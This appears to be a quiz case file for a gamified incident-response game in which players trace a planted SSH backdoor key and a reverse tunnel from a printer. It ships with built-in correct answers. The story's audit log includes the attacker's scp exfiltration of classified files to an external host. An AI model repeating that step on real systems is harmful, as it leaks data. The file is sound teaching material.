@@ -1,0 +1,379 @@
+# Murder Mystery Case 007: The SSH Phantom
+# A ghost in the machine
+
+case:
+  id: "case_007"
+  title: "The SSH Phantom"
+  subtitle: "Invisible Connections"
+  difficulty: "advanced"
+  estimated_time: "25-35 minutes"
+
+  intro: |
+    The government contractor sounds terrified on the phone.
+
+    "Someone is inside our classified network. We see connections
+    that don't exist. Logins from users who are on vacation.
+    Files accessed at 3 AM by people who were asleep."
+
+    "Sounds like compromised credentials," you suggest.
+
+    "That's what we thought. But we changed ALL passwords.
+    The phantom is still here. It's like... like they're already inside."
+
+    You've heard of this before. A persistent backdoor.
+    Someone installed a way in that no one knows about.
+
+  setting: |
+    DefenseTech Corp - Government contractor, classified projects.
+    The haunting: Impossible logins, invisible file access.
+    The mystery: Password resets don't stop the phantom.
+
+    Someone has keys that weren't supposed to exist.
+
+suspects:
+  - id: "carol"
+    name: "Carol Mitchell"
+    role: "Former Sysadmin"
+    description: "Left 6 months ago, built most of the infrastructure"
+    alibi: "Now works for competitor"
+    motive: "Left on bad terms, might have planted backdoors"
+
+  - id: "ryan"
+    name: "Ryan Foster"
+    role: "Current Sysadmin"
+    description: "Replaced Carol, finding weird things in configs"
+    alibi: "Reporting the issues"
+    motive: "Unknown - seems genuinely concerned"
+
+  - id: "nation"
+    name: "Nation State Actor"
+    role: "External Threat"
+    description: "Known APT groups target defense contractors"
+    alibi: "N/A"
+    motive: "Classified information theft"
+
+  - id: "insider"
+    name: "Unknown Insider"
+    role: "Current Employee"
+    description: "Someone still working here"
+    alibi: "Hidden among 500 employees"
+    motive: "Selling secrets, ideology, blackmail"
+
+scenes:
+  - id: "scene_01"
+    title: "The Impossible Logins"
+    location: "Security Operations Center"
+    narrative: |
+      The login logs tell an impossible story.
+      Users logging in from two places at once.
+      Sessions starting before authentication completes.
+
+      "Show me the auth logs," you say.
+
+    objective: "Analyze authentication anomalies"
+
+    challenges:
+      - id: "ch_07_01"
+        context: "Check the SSH authentication logs for unusual patterns"
+        question_type: "command_builder"
+        question: "Show the last 50 lines of /var/log/auth.log"
+        correct_answers:
+          - "tail -50 /var/log/auth.log"
+          - "tail -n 50 /var/log/auth.log"
+        hint: "tail -n or -50 shows the last N lines of a file"
+        success_narrative: |
+          Recent auth entries:
+
+          Mar 14 03:14:22 sshd: Accepted publickey for admin from 10.0.0.99
+          Mar 14 03:14:22 sshd: pam_unix: session opened for admin
+          Mar 14 03:14:25 sshd: Accepted publickey for jsmith from 10.0.0.99
+          Mar 14 03:14:26 sshd: Accepted publickey for dbrown from 10.0.0.99
+
+          Wait - admin, jsmith, and dbrown all logged in from the SAME IP
+          within 4 seconds? And all using public key authentication?
+
+          Someone has SSH keys for multiple accounts!
+        clue_unlocked: "Multiple users authenticated from same IP using SSH keys"
+
+      - id: "ch_07_02"
+        context: "Check what SSH keys are authorized for the admin account"
+        question_type: "command_builder"
+        question: "Display the authorized_keys file for the admin user"
+        correct_answers:
+          - "cat /home/admin/.ssh/authorized_keys"
+          - "cat ~admin/.ssh/authorized_keys"
+        hint: "Authorized SSH keys are stored in ~/.ssh/authorized_keys"
+        success_narrative: |
+          Authorized keys for admin:
+
+          ssh-rsa AAAAB3NzaC1yc2E... admin@defensetech.local
+          ssh-rsa AAAAB3NzaC1yc2E... admin-backup@server
+          ssh-rsa AAAAB3NzaC1yc2E... maintenance@localhost
+
+          Three keys! But admin should only have ONE key.
+          "maintenance@localhost" looks suspicious...
+          That's not a standard key comment.
+        clue_unlocked: "Unauthorized SSH key 'maintenance@localhost' found in admin's authorized_keys"
+
+  - id: "scene_02"
+    title: "The Hidden Key"
+    location: "SSH Key Analysis"
+    narrative: |
+      That "maintenance" key doesn't belong.
+      Someone added an extra key to the admin account.
+
+      But that same key might be in other accounts too.
+      Let's hunt for it.
+
+    objective: "Find all accounts with the unauthorized key"
+
+    challenges:
+      - id: "ch_07_03"
+        context: "Search all authorized_keys files for the suspicious 'maintenance' key"
+        question_type: "command_builder"
+        question: "Find all authorized_keys files containing 'maintenance' in /home/"
+        correct_answers:
+          - "grep -r 'maintenance' /home/*/.ssh/authorized_keys"
+          - "grep -rl 'maintenance' /home/ --include='authorized_keys'"
+        hint: "Use grep -r to recursively search for 'maintenance' in authorized_keys files"
+        success_narrative: |
+          Accounts with 'maintenance' key:
+
+          /home/admin/.ssh/authorized_keys
+          /home/jsmith/.ssh/authorized_keys
+          /home/dbrown/.ssh/authorized_keys
+          /home/cto/.ssh/authorized_keys
+          /home/finance/.ssh/authorized_keys
+          /root/.ssh/authorized_keys
+
+          The same key is in SIX accounts including root!
+          Someone has a master key to the entire system!
+        clue_unlocked: "Backdoor key found in 6 accounts including root"
+
+      - id: "ch_07_04"
+        context: "Find when this key was added to the accounts"
+        question_type: "command_builder"
+        question: "Show the modification time of all authorized_keys files in /home/"
+        correct_answers:
+          - "ls -la /home/*/.ssh/authorized_keys"
+          - "stat /home/*/.ssh/authorized_keys"
+          - "find /home -name authorized_keys -exec ls -la {} \\;"
+        hint: "ls -la shows file modification times"
+        success_narrative: |
+          File modification times:
+
+          Sep 15 2023  /home/admin/.ssh/authorized_keys
+          Sep 15 2023  /home/jsmith/.ssh/authorized_keys
+          Sep 15 2023  /home/dbrown/.ssh/authorized_keys
+          Sep 15 2023  /home/cto/.ssh/authorized_keys
+          Sep 15 2023  /home/finance/.ssh/authorized_keys
+          Sep 15 2023  /root/.ssh/authorized_keys
+
+          All modified on September 15, 2023!
+          That's exactly when Carol Mitchell left the company!
+        clue_unlocked: "All backdoor keys were added on Carol's last day"
+
+  - id: "scene_03"
+    title: "The Origin Point"
+    location: "Network Forensics"
+    narrative: |
+      Carol planted the keys on her last day.
+      But where is she connecting FROM?
+
+      IP 10.0.0.99 is an internal address...
+      But Carol doesn't work here anymore.
+
+    objective: "Trace the phantom's true location"
+
+    challenges:
+      - id: "ch_07_05"
+        context: "Find what device has IP 10.0.0.99"
+        question_type: "command_builder"
+        question: "Search DHCP logs for IP address 10.0.0.99"
+        correct_answers:
+          - "grep '10.0.0.99' /var/log/dhcp.log"
+          - "grep 10.0.0.99 /var/log/dhcp.log"
+        hint: "DHCP logs show which device got which IP"
+        success_narrative: |
+          DHCP assignment:
+
+          Mar 14 03:10:00 dhcpd: DHCPACK on 10.0.0.99 to 00:11:22:33:44:55 (PRINTER-FLOOR3)
+
+          Wait... that's a PRINTER?!
+          The phantom connections are coming from a network printer?!
+
+          Someone compromised the printer and is using it as a pivot point!
+        clue_unlocked: "Phantom connections originate from a compromised printer"
+
+      - id: "ch_07_06"
+        context: "Check for any reverse tunnels or SSH connections FROM the network"
+        question_type: "command_builder"
+        question: "Show all established SSH connections (port 22) on the network"
+        correct_answers:
+          - "netstat -an | grep ':22.*ESTABLISHED'"
+          - "ss -an | grep ':22.*ESTAB'"
+        hint: "netstat or ss shows network connections, filter for port 22"
+        success_narrative: |
+          Established SSH connections:
+
+          tcp  10.0.0.99:44521    -> 45.33.77.123:22  ESTABLISHED
+
+          There's an OUTBOUND SSH connection from the printer
+          to an external IP!
+
+          That's a reverse tunnel! Carol SSHs INTO the external server,
+          and the tunnel lets her access internal systems!
+        clue_unlocked: "Reverse SSH tunnel from printer to external server"
+
+  - id: "scene_04"
+    title: "The External Server"
+    location: "Threat Intelligence"
+    narrative: |
+      IP 45.33.77.123 - that's Carol's pivot point.
+      Let's find out what we can about it.
+
+    objective: "Investigate the external command and control server"
+
+    challenges:
+      - id: "ch_07_07"
+        context: "Look up the external IP to identify ownership"
+        question_type: "what_does_it_do"
+        question: |
+          What information does this command reveal?
+
+          whois 45.33.77.123 | grep -iE 'org|country|address'
+        options:
+          - "The organization and location that owns the IP address"
+          - "The open ports on the server"
+          - "The DNS records for the IP"
+          - "The SSL certificate information"
+        correct_answer: "The organization and location that owns the IP address"
+        hint: "whois looks up registration information for IP addresses"
+        success_narrative: |
+          WHOIS results:
+
+          OrgName: BulletProof Hosting Ltd
+          Country: Moldova
+          Address: Virtual Office, Chisinau
+
+          Moldova! A bulletproof hosting provider!
+          Carol is running her operation from a country with
+          no extradition treaty.
+        clue_unlocked: "External server hosted in Moldova by bulletproof provider"
+
+      - id: "ch_07_08"
+        context: "Check if classified files were accessed through the phantom sessions"
+        question_type: "command_builder"
+        question: "Search the audit log for file access to /classified/ directory"
+        correct_answers:
+          - "grep '/classified/' /var/log/audit/audit.log"
+          - "ausearch -f /classified/"
+        hint: "System audit logs track file access"
+        success_narrative: |
+          Classified file access:
+
+          Mar 14 03:20:11 | user=admin | file=/classified/project-sentinel/design.pdf | READ
+          Mar 14 03:21:45 | user=admin | file=/classified/project-sentinel/budget.xlsx | READ
+          Mar 14 03:22:33 | user=admin | file=/classified/project-sentinel/timeline.docx | READ
+          Mar 14 03:25:00 | user=admin | scp /classified/project-sentinel/* 45.33.77.123:~/loot/
+
+          She's stealing Project Sentinel!
+          The new missile defense system!
+          This is espionage!
+        clue_unlocked: "Carol exfiltrated classified Project Sentinel documents"
+
+  - id: "scene_05"
+    title: "Closing the Door"
+    location: "Incident Response"
+    narrative: |
+      Carol Mitchell - a trusted sysadmin turned spy.
+      She planted backdoors on her last day and has been
+      stealing secrets ever since.
+
+      Time to burn her access and alert the authorities.
+
+    objective: "Eliminate backdoor access and preserve evidence"
+
+    challenges:
+      - id: "ch_07_09"
+        context: "Remove the backdoor key from all authorized_keys files"
+        question_type: "command_builder"
+        question: "Remove all lines containing 'maintenance' from all authorized_keys files in /home/"
+        correct_answers:
+          - "find /home -name authorized_keys -exec sed -i '/maintenance/d' {} \\;"
+          - "grep -rl maintenance /home/*/.ssh/authorized_keys | xargs sed -i '/maintenance/d'"
+        hint: "Use find with -exec sed to remove lines, or grep -l with xargs sed"
+        success_narrative: |
+          Backdoor removed from:
+          - /home/admin/.ssh/authorized_keys
+          - /home/jsmith/.ssh/authorized_keys
+          - /home/dbrown/.ssh/authorized_keys
+          - /home/cto/.ssh/authorized_keys
+          - /home/finance/.ssh/authorized_keys
+          - /root/.ssh/authorized_keys
+
+          The phantom's key is revoked.
+          She can no longer authenticate.
+        clue_unlocked: "All backdoor keys removed"
+
+      - id: "ch_07_10"
+        context: "Block the external C2 server at the firewall"
+        question_type: "command_builder"
+        question: "Add an iptables rule to drop all traffic to IP 45.33.77.123"
+        correct_answers:
+          - "iptables -A OUTPUT -d 45.33.77.123 -j DROP"
+          - "iptables -I OUTPUT -d 45.33.77.123 -j DROP"
+        hint: "iptables -A OUTPUT -d <IP> -j DROP blocks outbound traffic to that IP"
+        success_narrative: |
+          Rule added:
+          OUTPUT -d 45.33.77.123 -j DROP
+
+          The reverse tunnel collapses.
+          Carol's connection to the internal network is severed.
+
+          Three months later, she's arrested in Germany
+          trying to sell Project Sentinel to a foreign government.
+
+          The FBI thanks you for closing the door before more
+          damage was done.
+        clue_unlocked: "C2 server blocked, espionage operation terminated"
+
+conclusion:
+  success: |
+    CASE CLOSED
+
+    Carol Mitchell was arrested on federal espionage charges:
+    - Unauthorized access to classified systems
+    - Theft of national defense information
+    - Conspiracy to commit espionage
+
+    The evidence was comprehensive:
+    - Backdoor SSH keys in 6 accounts
+    - Keys planted on her last day of employment
+    - Reverse tunnel from compromised printer
+    - Audit logs showing classified file access
+    - File transfers to foreign server
+
+    She faces 30 years to life in federal prison.
+    The printer was reimaged. The network was audited.
+    All SSH keys were rotated.
+
+    Evidence collected: {clues_found}/{total_clues}
+    Time taken: {time_taken}
+
+    The phantom has been exorcised.
+
+  failure: |
+    Without enough evidence, the backdoor remained open.
+    Carol continued her operation for months.
+
+    Project Sentinel specifications ended up in enemy hands.
+    DefenseTech lost their government contracts.
+
+    Always check your authorized_keys, Detective.
+
+rewards:
+  xp: 700
+  achievement: "phantom_exorcist"
+  achievement_name: "Phantom Exorcist"
+  achievement_description: "Traced and eliminated an SSH backdoor espionage operation"
